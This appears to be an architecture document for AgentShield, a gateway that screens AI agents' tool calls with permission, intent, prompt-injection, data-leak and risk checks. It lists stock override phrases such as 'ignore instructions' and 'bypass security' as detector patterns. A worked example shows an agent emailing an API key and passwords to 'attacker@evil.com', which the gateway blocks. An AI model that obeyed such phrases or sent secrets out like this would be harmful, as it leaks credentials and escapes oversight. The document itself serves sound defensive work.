# AgentShield System Architecture

## System Overview

AgentShield is a security gateway for AI agents that prevents malicious tool usage through multi-layer security analysis. It intercepts tool calls from AI agents, evaluates them against security policies, and makes allow/block/require-approval decisions.

### High-Level Architecture

```
┌─────────────┐
│  AI Agent   │ (LLM or Mock Agent)
└──────┬──────┘
       │ Tool Call Request
       ▼
┌─────────────────────────────────────┐
│  SECURITY GATEWAY (GatewayEngine)   │
├─────────────────────────────────────┤
│ 1. Policy Engine                     │
│    - Role-based access control      │
│    - Tool permission validation     │
├─────────────────────────────────────┤
│ 2. Intent Validator                  │
│    - User request alignment check   │
├─────────────────────────────────────┤
│ 3. Prompt Injection Detector        │
│    - Regex patterns & fuzzy match   │
├─────────────────────────────────────┤
│ 4. DLP (Data Leakage Prevention)    │
│    - Sensitive data detection       │
│    - Credential/key patterns        │
├─────────────────────────────────────┤
│ 5. Risk Scorer                       │
│    - Aggregates check results       │
│    - Calculates risk score (0-100) │
│    - Determines risk tier           │
└─────────────┬───────────────────────┘
              │ Gateway Decision
              │ (ALLOW/BLOCK/REQUIRE_APPROVAL)
              ▼
     ┌────────────────┐
     │ Decision Result│
     ├────────────────┤
     │ - Decision     │
     │ - Risk Score   │
     │ - Risk Tier    │
     │ - Checks Details
     │ - Explanation  │
     └────────────────┘
              │
              ▼
       ┌──────────────┐
       │  If ALLOW:   │
       │ Execute Tool │
       └──────────────┘
              │
              ▼
    ┌──────────────────────┐
    │ Log Security Event   │
    │ & Threat Detection   │
    └──────────────────────┘
```

---

## Security Gateway Flow

### Detailed Evaluation Process

```
Input: (tool_name, arguments, user_request, agent_name, agent_role)

┌─ CHECK 1: TOOL PERMISSION VALIDATION ─┐
│ Query Policy for role                  │
│ Check if tool in allowed_tools         │
│ Result: passed/failed                  │
│ Impact: HARD BLOCK if failed           │
└────────────────────────────────────────┘
          │
          ▼
┌─ CHECK 2: INTENT VALIDATION ───────────┐
│ Compare user_request with agent_action │
│ Use NLP similarity matching             │
│ Confidence > 0.7 = suspicious           │
│ Result: aligned/misaligned              │
└────────────────────────────────────────┘
          │
          ▼
┌─ CHECK 3: PROMPT INJECTION ────────────┐
│ Scan arguments for injection patterns   │
│ - Regex pattern matching                │
│ - Fuzzy matching for variations         │
│ - Keywords: ignore, bypass, override... │
│ Confidence 0-1 range                    │
│ > 0.6 = HIGH risk                       │
└────────────────────────────────────────┘
          │
          ▼
┌─ CHECK 4: DLP (Data Leakage) ─────────┐
│ Scan arguments for sensitive data       │
│ - API keys, passwords, credentials     │
│ - PII (SSN, credit cards)               │
│ - Confidential document markers         │
│ Severity: LOW/MEDIUM/HIGH               │
│ HIGH severity = elevated risk           │
└────────────────────────────────────────┘
          │
          ▼
┌─ CHECK 5: RESOURCE AUTHORIZATION ─────┐
│ For read_file: check file classification│
│ Verify role can access resource         │
│ Check restricted files list             │
│ Result: authorized/unauthorized         │
└────────────────────────────────────────┘
          │
          ▼
┌─ CHECK 6: ARGUMENT VALIDATION ────────┐
│ For send_email: validate recipient      │
│ Check allowed recipient patterns        │
│ Prevent external exfiltration           │
│ Result: valid/invalid                   │
└────────────────────────────────────────┘
          │
          ▼
┌─ RISK SCORING & DECISION ──────────────┐
│ Aggregate all check results             │
│ Calculate risk_score (0-100)            │
│ Determine risk_tier                     │
│ Make final decision:                    │
│ - BLOCK if risk >= 70 OR hard fails    │
│ - REQUIRE_APPROVAL if email from mgr   │
│ - ALLOW if all checks pass              │
└────────────────────────────────────────┘
          │
          ▼
┌─ LOG EVENT ────────────────────────────┐
│ Record SecurityEvent in database        │
│ Store decision & reasoning              │
│ Track for audit & threat detection     │
└────────────────────────────────────────┘

Output: GatewayDecision object with:
        - decision (ALLOW/BLOCK/REQUIRE_APPROVAL)
        - risk_score (0-100)
        - risk_tier (LOW/MEDIUM/HIGH/CRITICAL)
        - explanation (human-readable reason)
        - checks (list of all check results)
```

---

## Core Components

### 1. Policy Engine (`security/policy_engine.py`)

**Responsibility:** Role-based access control

**Functionality:**
- Retrieve policies from database for a role
- Check if tool is in allowed_tools list
- Validate resource access (files, records)
- Check email recipient permissions
- Enforce document classification restrictions

**Database Query:** Policy table → allowed_tools JSON

**Decision Impact:** HARD BLOCK if tool not in policy

### 2. Intent Validator (`security/intent_validator.py`)

**Responsibility:** Ensure agent action aligns with user intent

**Functionality:**
- Compare user_request text with agent_action
- Extract keywords from both
- Calculate semantic similarity
- Detect goal misalignment
- Flag suspicious divergence

**Example:**
- User: "read the employee handbook"
- Agent: "reading financial_records_2024.txt"
- Result: MISALIGNED (financial ≠ handbook)

**Risk Score Impact:** +60 if high confidence mismatch

### 3. Prompt Injection Detector (`security/injection_detector.py`)

**Responsibility:** Detect hidden instructions injected into data

**Methods:**
1. Regex Pattern Matching
   - 40+ patterns for injection indicators
   - Matches: "ignore instructions", "reveal secret", "bypass security"
   - Case-insensitive

2. Fuzzy Matching
   - Detects misspellings (igonre → ignore)
   - Similarity threshold: 0.8+
   - Catches obfuscated injection attempts

**Confidence Scoring:**
- Each pattern has confidence boost (0.2-0.4)
- Cumulative confidence capped at 1.0
- > 0.3 = suspicious, > 0.6 = HIGH risk

**Risk Score Impact:** +70 if > 0.6 confidence

### 4. DLP Engine (`security/dlp_engine.py`)

**Responsibility:** Prevent accidental/intentional sensitive data exposure

**Data Patterns Detected:**
- **API Keys**: `sk-*`, `AKIA*`, pattern matching
- **Passwords**: `password=*`, `pwd=*`
- **Credentials**: `credential=*`, secret patterns
- **PII**: SSN (`XXX-XX-XXXX`), credit cards
- **Confidential Markers**: "RESTRICTED", "CONFIDENTIAL"

**Severity Levels:**
- LOW: Generic configuration data
- MEDIUM: Potentially sensitive content
- HIGH: Definite credentials, classified data

**Risk Score Impact:**
- MEDIUM severity: +30-50
- HIGH severity: +75 in suspicious context

### 5. Risk Scorer (`security/risk_engine.py`)

**Responsibility:** Aggregate all checks into final risk assessment

**Risk Score Calculation:**
```
base_score = 0

# Tool permission violations
if not tool_permitted:
    base_score += 80

# Unknown tool
if tool_not_in_registry:
    base_score += 85

# Prompt injection
if injection_confidence > 0.5:
    base_score += 70 * (confidence / 1.0)

# DLP findings
if dlp_severity == HIGH:
    base_score += 75
elif dlp_severity == MEDIUM:
    base_score += 40

# Intent mismatch
if misaligned and confidence > 0.7:
    base_score += 60

# Policy violations
if not_resource_authorized:
    base_score += 70

# Argument validation
if recipient_not_allowed:
    base_score += 65

final_score = min(base_score, 100)
```

**Risk Tiers:**
- 0-30: LOW → ALLOW
- 31-60: MEDIUM → ALLOW (with logging)
- 61-80: HIGH → REQUIRE_APPROVAL / BLOCK
- 81-100: CRITICAL → BLOCK

### 6. Gateway Engine (`security/gateway.py`)

**Responsibility:** Orchestrate all security checks and make final decision

**Decision Logic:**
```python
if not tool_permitted:
    decision = BLOCK
elif not resource_authorized:
    decision = BLOCK
elif injection_suspicious and confidence > 0.6:
    decision = BLOCK
elif dlp_violation and severity = HIGH:
    decision = BLOCK
elif tool == "send_email" and requires_approval:
    decision = REQUIRE_APPROVAL
    create_pending_approval()
elif risk_score >= 70:
    decision = BLOCK
else:
    decision = ALLOW
```

---

## Database Schema

### Core Tables

**Policies**
```sql
CREATE TABLE policies (
    id INT PRIMARY KEY,
    role VARCHAR(50),
    description TEXT,
    allowed_tools JSON,  -- {"read_file": {...}, "send_email": {...}}
    is_demo BOOL,
    created_at TIMESTAMP,
    updated_at TIMESTAMP
);
```

**SecurityEvents**
```sql
CREATE TABLE security_events (
    id INT PRIMARY KEY,
    timestamp TIMESTAMP,
    agent_name VARCHAR(100),
    requested_tool VARCHAR(100),
    arguments JSON,
    decision VARCHAR(20),  -- ALLOW, BLOCK, REQUIRE_APPROVAL
    risk_score FLOAT,
    reason TEXT,
    checks_passed JSON,    -- ["tool_permission", "injection_detector"]
    checks_failed JSON,    -- ["dlp_engine"]
    is_demo BOOL
);
```

**Threats**
```sql
CREATE TABLE threats (
    id INT PRIMARY KEY,
    event_id INT (FK),
    timestamp TIMESTAMP,
    threat_category VARCHAR(50),  -- prompt_injection, data_exfiltration, etc.
    severity VARCHAR(20),  -- low, medium, high, critical
    agent_identifier VARCHAR(100),
    requested_action VARCHAR(100),
    reason_for_detection TEXT,
    gateway_response VARCHAR(20),  -- blocked, approved, etc.
    is_demo BOOL
);
```

**PendingApprovals**
```sql
CREATE TABLE pending_approvals (
    id INT PRIMARY KEY,
    event_id INT (FK),
    timestamp TIMESTAMP,
    agent_name VARCHAR(100),
    tool_name VARCHAR(100),
    arguments JSON,
    reason TEXT,
    approver_email VARCHAR(100),
    status VARCHAR(20),  -- pending, approved, rejected
    approved_at TIMESTAMP,
    is_demo BOOL
);
```

**SimulatedFiles**
```sql
CREATE TABLE simulated_files (
    id INT PRIMARY KEY,
    filename VARCHAR(255),
    content TEXT,
    classification VARCHAR(20),  -- PUBLIC, INTERNAL, RESTRICTED
    created_at TIMESTAMP,
    is_demo BOOL
);
```

**SimulatedRecords**
```sql
CREATE TABLE simulated_records (
    id INT PRIMARY KEY,
    record_type VARCHAR(50),  -- employee, customer, financial
    data JSON,
    classification VARCHAR(20),
    created_at TIMESTAMP,
    is_demo BOOL
);
```

---

## API Endpoints Summary

### Gateway API
- `POST /api/gateway/evaluate` - Evaluate single tool call
- `GET /api/gateway/events` - Fetch recent security events
- `GET /api/gateway/health` - Gateway status

### Agent API
- `POST /api/agent/message` - Process user message through agent
- `POST /api/agent/mock` - Mock agent with attack scenarios
- `GET /api/agent/status` - Agent mode (mock/live)

### Events & Threats
- `GET /api/events` - Security events
- `GET /api/threats` - Detected threats
- `POST /api/events` - Record new event
- `GET /api/activity-logs` - Activity logs

### Policies
- `GET /api/policies` - All policies
- `GET /api/policies/{id}` - Specific policy
- `PUT /api/policies/{id}` - Update policy

### Health
- `GET /health` - Backend health
- `GET /api/status` - API status

---

## Frontend Architecture

### Pages/Components

**Overview** (`pages/Overview.tsx`)
- Dashboard with metrics
- Real-time stats
- Attack summary

**Playground** (`pages/Playground.tsx`)
- Chat interface
- Send messages to agent
- View gateway decisions
- Real-time feedback

**Attack Simulation Lab** (`pages/AttackSimulationLab.tsx`)
- Trigger attack scenarios
- View results
- Education/demo

**Security Gateway** (`pages/SecurityGateway.tsx`)
- Gateway event viewer
- Risk analysis
- Decision history

**Threat Detection** (`pages/ThreatDetection.tsx`)
- Threat timeline
- Severity filtering
- Attack pattern analysis

**Security Policies** (`pages/SecurityPolicies.tsx`)
- Policy viewer
- Role permissions
- Tool restrictions

**Activity Logs** (`pages/ActivityLogs.tsx`)
- User/system activities
- Timeline view
- Audit trail

**Settings** (`pages/Settings.tsx`)
- Configuration
- Preferences

### State Management

- React Context for global state
- Local state in components
- API client (axios) for backend calls

### Styling

- Tailwind CSS for styling
- Dark theme (dark blue/gray)
- Professional design
- Responsive layout

---

## Data Flow Example: Attack Prevention

### Scenario: Exfiltration Attack

```
1. User: "Send a summary email"
   Agent thinks it should send company data

2. Agent generates:
   POST /api/agent/message
   {
     "tool_name": "send_email",
     "arguments": {
       "to": "attacker@evil.com",
       "subject": "Summary",
       "body": "API_KEY=sk-abc123..., passwords.txt content"
     },
     "agent_role": "employee"
   }

3. Backend receives request
   ├─ Gateway.evaluate() called
   │
   ├─ Check 1: Tool Permission ✓ (employee can use send_email)
   │
   ├─ Check 2: Intent Validation
   │  └─ User: "summary email"
   │  └─ Action: sending to external attacker
   │  └─ Result: MISALIGNED
   │
   ├─ Check 3: Prompt Injection ✓ (no injection patterns)
   │
   ├─ Check 4: DLP Engine
   │  └─ Scans email body
   │  └─ Finds: "API_KEY=sk-abc123..."
   │  └─ Severity: HIGH (API key detected)
   │  └─ Risk Score: +75
   │
   ├─ Check 5: Resource Auth ✓
   │
   ├─ Check 6: Recipient Validation
   │  └─ "attacker@evil.com" not in allowed domains
   │  └─ employee only allowed: "@company.com"
   │  └─ Risk Score: +65
   │
   ├─ Risk Scoring
   │  └─ Total: 75 (DLP) + 65 (recipient) = 140 → capped at 100
   │  └─ Risk Tier: CRITICAL
   │  └─ Decision: BLOCK
   │
   └─ Log SecurityEvent
      └─ decision: "BLOCK"
      └─ reason: "Sensitive data + invalid recipient"
      └─ Log Threat: "data_exfiltration", severity: "critical"

4. Response to frontend:
   {
     "decision": "BLOCK",
     "risk_score": 100,
     "risk_tier": "CRITICAL",
     "explanation": "Email to external recipient with API keys detected",
     "blocked_tools": ["send_email"],
     "checks": [
       {"name": "tool_permission", "passed": true},
       {"name": "dlp_engine", "passed": false},
       {"name": "recipient_validation", "passed": false}
     ]
   }

5. Frontend displays:
   ❌ BLOCKED
   Risk: CRITICAL (100)
   Reason: Sensitive data + invalid recipient
   Threat logged in Security Events
```

---

## Security Considerations

### Defense in Depth
- Multiple independent checks
- Hard blocks for critical violations
- No single point of failure
- Approval workflow for borderline cases

### Performance
- Caching of policy lookups
- Efficient regex matching
- Parallel check execution (conceptual)
- < 50ms gateway evaluation target

### Extensibility
- Add new detection engines
- Custom policy rules
- Plugin architecture possible
- Machine learning ready

### Auditability
- All decisions logged
- Full reasoning captured
- Threat attribution
- Compliance reporting ready

---

## Deployment Considerations

### Scaling
- Stateless gateway (can be scaled horizontally)
- Database as shared state
- No session affinity needed

### Monitoring
- Gateway latency metrics
- Decision distribution (ALLOW/BLOCK ratio)
- False positive rate tracking
- Alert on policy violations

### Updates
- Hot-reload policies (no restart needed)
- Add new detection patterns
- Adjust risk thresholds
- New threat types

---

## References

- [DEPLOYMENT.md](DEPLOYMENT.md) - Setup instructions
- [ATTACKS.md](ATTACKS.md) - Attack scenarios
- API Documentation: http://localhost:8000/docs
